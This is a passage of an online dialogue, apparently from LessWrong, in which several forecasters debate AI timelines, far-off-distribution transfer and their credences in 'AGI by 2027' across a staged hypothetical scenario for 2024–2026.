get AI systems that can substitute for humans on most or all tasks of the economy. However, I would not be surprised by a mild acceleration of overall economic growth driven by the impact of AI. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:28:51 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:28:51 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> This is mostly because I don&#39;t expect just putting 1e30 FLOP of training compute into a system will be enough to get AI systems that can substitute for humans on most or all tasks of the economy.</p></blockquote><p> To check, do you think that having perfect ems of some productive human would be transformative, a la <a href="https://www.cold-takes.com/the-duplicator/#explosive-growth">the Duplicator</a> ?</p><p> If so, what is the main reason you don&#39;t think a sufficiently bigger training run would lead to something of that level of impact? Is this related to the savannah-to-boardroom generalization / human-level learning-of-new things point I raised previously? </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 19:32:48 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 19:32:48 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> To check, do you think that having perfect ems of some productive human would be transformative, a la <a href="https://www.cold-takes.com/the-duplicator/#explosive-growth">the Duplicator</a> ?</p></blockquote><p> Eventually, yes, but even there I expect substantial amounts of delay (median of a few years, maybe as long as a decade) because people won&#39;t immediately start using the technology.</p><blockquote><p> If so, what is the main reason you don&#39;t think a sufficiently bigger training run would lead to something of that level of impact? Is this related to the savannah-to-boardroom generalization / human-level learning-of-new things point I raised previously?</p></blockquote><p> I think that&#39;s an important part of it, yes. I expect the systems we&#39;ll have in 10 years will be really good at some things with some bizarre failure modes and domains where they lack competence. My example of GPT-4 not being able to play tic-tac-toe is rather anecdotal, but I would worry about other things of a similar nature when we actually want these systems to replace humans throughout the economy. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:34:05 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:34:05 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><blockquote><p> Eventually, yes, but even there I expect substantial amounts of delay (median of a few years, maybe as long as a decade) because people won&#39;t immediately start using the technology.</p></blockquote><p> Interestingly, I think in the case of ems this is more plausible than in the case of normal AGI. Because normal AGI will be more easily extendible to superhuman levels. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:35:19 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:35:19 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> FWIW I think the kind of AGI you and I are imagining as the most plausible first AGI is pretty janky, and the main way I see it improving stuff is by doing normal ML R&amp;D, not galaxy-brained &quot;editing its own source code by hand&quot; stuff. The normal AI R&amp;D could be done by all the ems too.</p><p> (It depends on where the AI is at when you imagine dropping ems into the scenario.) </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:34:05 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:34:05 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> I agree with that. The jankiness is a point in my favor, because it means there&#39;s lots of room to grow by ironing out the kinks. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:34:05 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:34:05 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> Overall Ege, thanks for writing that scenario! Here are some questions / requests for elaboration:<br><br> (1) So in your median world, when do we finally get to AGI, and what changes between 2030 and then that accounts for the difference?<br><br> (2) I take it that in this scenario, despite getting IMO gold etc. the systems of 2030 are not able to do the work of today&#39;s OAI engineer? Just clarifying. Can you say more about what goes wrong when you try to use them in such a role? Or do you think that AI R&amp;D will indeed benefit from automated engineers, but that AI progress will be bottlenecked on compute or data or insights or something that won&#39;t be accelerating?</p><p> (3) What about AI takeover? Suppose an AI lab in 2030, in your median scenario, &quot;goes rogue&quot; and decides &quot;fuck it, let&#39;s just deliberately make an unaligned powerseeking AGI and then secretly put it in charge of the whole company.&quot; What happens then? </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 19:39:56 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 19:39:56 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> (1) So in your median world, when do we finally get to AGI, and what changes between 2030 and then that accounts for the difference?<br><br> (2) I take it that in this scenario, despite getting IMO gold etc. the systems of 2030 are not able to do the work of today&#39;s remote OAI engineer? Just clarifying. Can you say more about what goes wrong when you try to use them in such a role? Or do you think that AI R&amp;D will indeed benefit from automated engineers, but that AI progress will be bottlenecked on compute or data or insights or something that won&#39;t be accelerating?<br><br> (3) What about AI takeover? Suppose an AI lab in 2030, in your median scenario, &quot;goes rogue&quot; and decides &quot;fuck it, let&#39;s just deliberately make an unaligned powerseeking AGI and then secretly put it in charge of the whole company.&quot; What happens then?</p></blockquote><p> (1): I&#39;m sufficiently uncertain about this that I don&#39;t expect my median world to be particularly representative of the range of outcomes I consider plausible, especially when it comes to giving a date. What I expect to happen is a boring process of engineering that gradually irons out the kinks of the systems, gradual hardware progress allowing bigger training runs, better algorithms allowing for better in-context learning, and many other similar things. As this continues, I expect to see AIs substituting for humans on more and more tasks in the economy, until at some point AIs become superior to humans across the board.<br><br> (2): AI R&amp;D will benefit from AI systems, but they won&#39;t automate everything an engineer can do. I think when you try to use the systems in practical situations; they might lose coherence over long chains of thought, or be unable to effectively debug non-performant complex code, or not be able to have as good intuitions about which research directions would be promising, et cetera. In 10 years I fully expect many people in the economy to substantially benefit from AI systems, and AI engineers probably more than most.<br><br> (3): I don&#39;t think anything notable would happen. I don&#39;t believe the AI systems of 2030 will be capable enough to manage an AI lab. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:43:37 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:43:37 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> I think Ege&#39;s median world is plausible, just like Daniel&#39;s median world; I think my probability on &quot;Ege world or more chill than that&quot; is lower than my probability on &quot;Daniel world or less chill than that.&quot; Earlier I said 25% on Daniel-or-crazier, I think I&#39;m at 15% on Ege-or-less-crazy. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:46:08 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:46:08 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> Re: the &quot;fuck it&quot; scenario: What I&#39;m interested in here is what skills you think the system would be lacking, that would make it fail. Like right now for example we had a baby version of this with ChaosGPT4, which lacked strategic judgment and also had a very high mistakes-to-ability-to-recover-from-mistakes ratio, and also started from a bad position (being constantly monitored, zero human allies). So all it did was make some hilarious tweets and get shut down. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:46:27 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:46:27 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> Ege, do you think you&#39;d update if you saw a demonstration of sophisticated sample-efficient in-context learning and far-off-distribution transfer?</p><p> Eg suppose some AI system was trained to learn new video games: each RL episode was it being shown a video game it had never seen, and it&#39;s supposed to try to play it; its reward is the score it gets. Then after training this system, you show it a whole new <i>type</i> of video game it has never seen (maybe it was trained on platformers and point-and-click adventures and visual novels, and now you show it a first-person-shooter for the first time). Suppose it could get decent at the first-person-shooter after like a subjective hour of messing around with it. If you saw that demo in 2025, how would that update your timelines? </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 19:47:16 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 19:47:16 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> Ege, do you think you&#39;d update if you saw a demonstration of sophisticated sample-efficient in-context learning and far-off-distribution transfer?<br></p></blockquote><p>是的。</p><blockquote><p> Suppose it could get decent at the first-person-shooter after like a subjective hour of messing around with it. If you saw that demo in 2025, how would that update your timelines?</p></blockquote><p> I would probably update substantially towards agreeing with you. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:49:01 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:49:01 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><blockquote><p> (1): I&#39;m sufficiently uncertain about this that I don&#39;t expect my median world to be particularly representative of the range of outcomes I consider plausible, especially when it comes to giving a date. What I expect to happen is a boring process of engineering which gradually irons out the kinks of the systems, gradual hardware progress allowing bigger training runs, better algorithms allowing for better in-context learning, and many other similar things. As this continues, I expect to see AIs substituting for humans on more and more tasks in the economy, until at some point AIs become superior to humans across the board.</p></blockquote><p> Your median is post-2060 though. So I feel like you need to justify why this boring process of engineering is going to take 30 more years after 2030. Why 30 years and not 300? Indeed, why not 3? </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:51:56 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:51:56 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><blockquote><p> (2): AI R&amp;D will benefit from AI systems, but they won&#39;t automate everything an engineer can do. I think when you try to use the systems in practical situations; they might lose coherence over long chains of thought, or be unable to effectively debug non-performant complex code, or not be able to have as good intuitions about which research directions would be promising, et cetera. In 10 years I fully expect many people in the economy to substantially benefit from AI systems, and AI engineers probably more than most.</p></blockquote><p> How much do you think they&#39;ll be automating/speeding things up? Can you give an example of a coding task such that, if AIs can do that coding task by, say, 2025, you&#39;ll update significantly towards shorter timelines, on the grounds that they are by 2025 doing things you didn&#39;t expect to be doable by 2030?<br><br> (My position is that all of these deficiencies exist in current systems but (a) will rapidly diminish over the next few years and (b) aren&#39;t strong blockers to progress anyway, eg even if they don&#39;t have good research taste they can still speed things up substantially just by doing the engineering and cutting through the schlep) </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 19:54:49 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 19:54:49 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> Your median is post-2060 though. So I feel like you need to justify why this boring process of engineering is going to take 30 more years after 2030. Why 30 years and not 300? Indeed, why not 3?</p></blockquote><p> I don&#39;t think it&#39;s going to take ~30 (really 40 per the distribution I submitted) years after 2030, that&#39;s just my median. I think there&#39;s a 1/3 chance it takes more than 75 and 1/5 chance it takes more than 175.<br><br> If you&#39;re asking me to justify why my median is around 2065, I think this is not really that easy to do as I&#39;m essentially just expressing the betting odds I would accept based on intuition.<br><br> Formalizing it is tricky, but I think I could say I don&#39;t find it that plausible the problem of building AI is so hard that we won&#39;t be able to do it even after 300 years of hardware and software progress. Just the massive scaling up of compute we could get from hardware progress and economic growth over that kind of timescale would enable things that look pretty infeasible over the next 20 or 30 years.</p></div></section><h2> Far-off-distribution transfer </h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 19:47:18 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 19:47:18 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> The Ege/Ajeya point about far-off-distribution transfer seem like an interesting maybe-crux, so let&#39;s go into that for a bit.</p><p> My guess is Ajeya has pretty high probability that that kind of distribution transfer will happen within the next few years and very likely the next decade? </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:48:16 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:48:16 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> Yeah, FWIW I think the savannah-to-boardroom transfer stuff is probably underlying past-Eliezer (not sure about current Eliezer) and also a lot of &quot;stochastic parrot&quot;-style skeptics. I think it&#39;s a good point under-discussed by the short timelines crowd, though I don&#39;t think it&#39;s decisive. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:49:32 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:49:32 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> My guess is Ajeya has pretty high probability that that kind of distribution transfer will happen within the next few years and very likely the next decade?</p></blockquote><p> Actually I&#39;m pretty unsure, and slightly lean toward no. I just think it&#39;ll take a lot of hard work to make up for the weaknesses of not having transfer this good. Paul has a good unpublished Google doc titled &quot;Doing without transfer.&quot; I think by the time systems are transformative enough to massively accelerate AI R&amp;D, they will still not be that close to savannah-to-boardroom level transfer, but it will be fine because they will be trained on exactly what we wanted them to do for us. (This btw also underlies some lower-risk-level intuitions I have relative to MIRI crowd.) </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 19:51:05 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 19:51:05 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><blockquote><p> Actually I&#39;m pretty unsure, and slightly lean toward no.</p></blockquote><p> Oh, huh, that is really surprising to me. But good to have that clarified. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:52:00 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:52:00 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> Yeah, I just think the way we get our OAI-engineer-replacing-thingie is going to be radically different cognitively than human OAI-engineers, in that it will have coding instincts honed through ancestral memory the way grizzly bears have salmon-catching instincts baked into them through their ancestral memory. For example, if you give it a body, I don&#39;t think it&#39;d learn super quickly to catch antelope in the savannah, the way a baby human caveperson could learn to code if you transported them to today.</p><p> But it&#39;s salient to me that this might just leave a bunch of awkward gaps, since we&#39;re trying to make do with systems holistically less intelligent than humans, but just more specialized to coding, writing, and so on. This is why I think the Ege world is plausible.</p><p> I also dislike using the term AGI for this reason. (Or rather, I think there is a thing people have in mind by AGI which makes sense, but it will come deep into the Singularity, after the earlier transformative AI systems that are not AGI-in-this-sense.) </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 19:57:19 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 19:57:19 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> I also dislike using the term AGI for this reason.</p></blockquote><p> In my median world, the term &quot;AGI&quot; also becomes increasingly meaningless because different ways people have operationalized criteria for what counts as AGI and what doesn&#39;t begin to come apart. For example, we have AIs that can pass the Turing test for casual conversation (even if judges can ask about recent events), but these AIs can&#39;t be plugged in to do an ordinary job in the economy. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 19:58:52 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 19:58:52 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> In my median world, the term &quot;AGI&quot; also becomes increasingly meaningless because different ways people have operationalized criteria for what counts as AGI and what doesn&#39;t begin to come apart. For example, we have AIs that can pass the Turing test for casual conversation (even if judges can ask about recent events), but these AIs can&#39;t be plugged in to do an ordinary job in the economy.</p></blockquote><p> Yes, I&#39;m very sympathetic to this kind of thing, which is why I like TAI (and it&#39;s related to the fact that I think we&#39;ll first have grizzly-bears-of-coding, not generally-intelligent-beings). But it bites much less in my view because it&#39;s all much more compressed and there&#39;s a pretty shortish period of a few years where all plausible things people could mean by AGI are achieved, including the algorithm that has savannah-to-boardroom-level transfer.</p></div></section><h2> A concrete scenario &amp; where its surprises are </h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 19:59:49 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 19:59:49 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> We can delete this hook later if no one bites, but in case someone does, here&#39;s a scenario I think it would be productive to discuss:<br><br> (1) Q1 2024: A bigger, better model than GPT-4 is released by some lab. It&#39;s multimodal; it can take a screenshot as input and output not just tokens but keystrokes and mouseclicks and images. Just like with GPT-4 vs. GPT-3.5 vs. GPT-3, it turns out to have new emergent capabilities. Everything GPT-4 can do, it can do better, but there are also some qualitatively new things that it can do (though not super reliably) that GPT-4 couldn&#39;t do.</p><p> (2) Q3 2024: Said model is fine-tuned to be an agent. It was already better at being strapped into an AutoGPT harness than GPT-4 was, so it was already useful for some things, but now it&#39;s being trained on tons of data to be a general-purpose assistant agent. Lots of people are raving about it. It&#39;s like another ChatGPT moment; people are using it for all the things they used ChatGPT for but then also a bunch more stuff. Unlike ChatGPT you can just leave it running in the background, working away at some problem or task for you. It can write docs and edit them and fact-check them; it can write code and then debug it.</p><p> (3) Q1 2025: Same as (1) all over again: An even bigger model, even better. Also it&#39;s not just AutoGPT harness now, it&#39;s some more sophisticated harness that someone invented. Also it&#39;s good enough to play board games and some video games decently on the first try.</p><p> (4) Q3 2025: OK now things are getting serious. The kinks have generally been worked out. This newer model is being continually trained on oodles of data from a huge base of customers; they have it do all sorts of tasks and it tries and sometimes fails and sometimes succeeds and is trained to succeed more often. Gradually the set of tasks it can do reliably expands, over the course of a few months. It doesn&#39;t seem to top out; progress is sorta continuous now -- even as the new year comes, there&#39;s no plateauing, the system just keeps learning new skills as the training data accumulates. Now many millions of people are basically treating it like a coworker and virtual assistant. People are giving it their passwords and such and letting it handle life admin tasks for them, help with shopping, etc. and of course quite a lot of code is being written by it. Researchers at big AGI labs swear by it, and rumor is that the next version of the system, which is already beginning training, won&#39;t be released to the public because the lab won&#39;t want their competitors to have access to it. Already there are claims that typical researchers and engineers at AGI labs are approximately doubled in productivity, because they mostly have to just oversee and manage and debug the lightning-fast labor of their AI assistant. And it&#39;s continually getting better at doing said debugging itself.</p><p> (5) Q1 2026: The next version comes online. It is released, but it refuses to help with ML research. Leaks indicate that it doesn&#39;t refuse to help with ML research internally, and in fact is heavily automating the process at its parent corporation. It&#39;s basically doing all the work by itself; the humans are basically just watching the metrics go up and making suggestions and trying to understand the new experiments it&#39;s running and architectures it&#39;s proposing.</p><p> (6) Q3 2026 Superintelligent AGI happens, by whatever definition is your favorite. And you see it with your own eyes.<br><br> <strong>Question:</strong> Suppose this scenario happens. What does your credence in &quot;AGI by 2027&quot; look like at each of the 6 stages? Eg what are the biggest updates, and why?<br><br> My own first-pass unconfident answer is:<br> 0 -- 50%<br> 1 -- 50%<br> 2 -- 65%<br> 3 -- 70%<br> 4 -- 90%<br> 5 -- 95%<br> 6 -- 100% </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 20:03:55 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 20:03:55 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> (3) Q1 2025: Same as (1) all over again: An even bigger model, even better. Also it&#39;s not just AutoGPT harness now, it&#39;s some more sophisticated harness that someone invented. Also it&#39;s good enough to play board games and some video games decently on the first try.</p></blockquote><p> I don&#39;t know how much I care about this (not zero), but I think someone with Ege&#39;s views should care a lot about how it was trained. Was it trained on a whole bunch of very similar board games and video games? How much of a distance of transfer is this, if savannah to boardroom is 100? </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 20:06:26 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 20:06:26 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><p> FWIW I interpreted this literally: we have some bigger model like chatgpt that can play some games decently on the first try, and conditional on (2) my median world has those games being mostly stuff similar to what it&#39;s seen before<br><br> so i&#39;m not assuming much evidence of transfer from (2), only some mild amount </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 20:03:48 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 20:03:48 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> Yeah, let&#39;s briefly have people try to give probability estimates here, though my model of Ege feels like the first few stages have a ton of ambiguity in their operationalization, which will make it hard to answer in concrete probabilities. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 20:03:55 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 20:03:55 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> +1, I also find the ambiguity makes answering this hard</p><p> I&#39;ll wait for Ege to answer first. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 20:06:26 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 20:06:26 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><p> Re: Daniel, according to my best interpretation of his steps:<br><br> 0 -- 6%<br> 1 -- 6%<br> 2 -- 12%<br> 3 -- 15%<br> 4 -- 30%<br> 5 -- 95%<br> 6 -- 100% </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 20:11:03 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 20:11:03 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> Okay here&#39;s my answer:</p><p> 0 -- 20%<br> 1 -- 28%<br> 2 -- 37%<br> 3 -- 50%<br> 4 -- 75%<br> 5 -- 87%<br> 6 -- 100%</p><p> My updates are spread out pretty evenly because the whole scenario seems qualitatively quite plausible and most of my uncertainty is simply whether it will take more scale or more schlep at each stage than is laid out here (including stuff like making it more reliable for a combo of PR and regulation and usable-product reasons). </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 20:15:09 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 20:15:09 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> Thanks both! I am excited about this for a few reasons. One I think it might help to focus the discussion on the parts of the story that are biggest updates for you (and also on the parts that are importantly ambiguous! I&#39;m curious to hear about those!) and two, because as the next three years unfold, we&#39;ll be able to compare what happens to this scenario. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 20:15:45 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 20:15:45 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><p> unfortunately i think the scenarios are vague enough that as a practical matter it will be tricky to adjudicate or decide whether they&#39;ve happened or not </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 20:15:09 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 20:15:09 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> I agree, but I still think it&#39;s worthwhile to do this. Also this was just a hastily written scenario, I&#39;d love to improve it and make it more precise, and I&#39;m all ears for suggestions! </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 20:13:11 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 20:13:11 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> Ege, I&#39;m surprised you&#39;re at 95% at stage 5, given that stage 5&#39;s description is just that AI is doing a lot of AI R&amp;D and leaks suggest it&#39;s going fast. If your previous timelines were several decades, then I&#39;d think even with non-god-like AI systems speeding up R&amp;D it should take like a decade? </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 20:15:45 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 20:15:45 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><p> I think once you&#39;re at step 5 it&#39;s overwhelmingly likely that you already have AGI. The key sentence for me is &quot;it&#39;s basically doing all the work by itself&quot; - I have a hard time imagining worlds where an AI can do basically all of the work of running an AI lab by itself but AGI has still not been achieved.<br><br> If the AI&#39;s role is more limited than this, then my update from 4 to 5 would be much smaller. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 20:17:04 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 20:17:04 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><p> I thought Daniel said it was doing all the ML R&amp;D by itself, and the humans were managing it (the AIs are in the role of ICs and the humans are in the role of managers at a tech company). I don&#39;t think it&#39;s obvious that just because some AI systems can pretty autonomously do ML R&amp;D, they can pretty autonomously do everything, and I would have expected your view to agree with me more there. Though maybe you think that if it&#39;s doing ML R&amp;D autonomously, it must have intense transfer / in-context-learning and so it&#39;s almost definitely across-the-board superhuman? </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 20:19:43 GMT" 